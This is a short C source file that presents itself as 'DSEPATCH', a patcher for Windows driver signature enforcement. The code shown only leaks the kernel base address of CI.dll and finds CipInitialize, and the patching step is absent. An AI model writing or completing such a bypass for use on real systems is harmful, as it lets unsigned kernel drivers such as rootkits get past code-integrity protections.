/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"


int main(int argc, char **argv)
{
  LPVOID CiImagepMem   = 0;
  LPVOID CiImageBase   = 0;
  LPVOID CipInitBase   = 0;
  DWORD  CiImageLen    = 0;

  CiImageBase = KeGetBase("CI.dll", &CiImageLen);
  if ( (CiImageBase != NULL) )
  {
    printf("[+] Leaked CI @ %p\n", CiImageBase);
    if ( (CipInitBase = GetCipInit(CiImageBase)) != NULL )
    {
	    printf("[+] CipInitialize @ %p\n", CipInitBase);
    };
  };
};
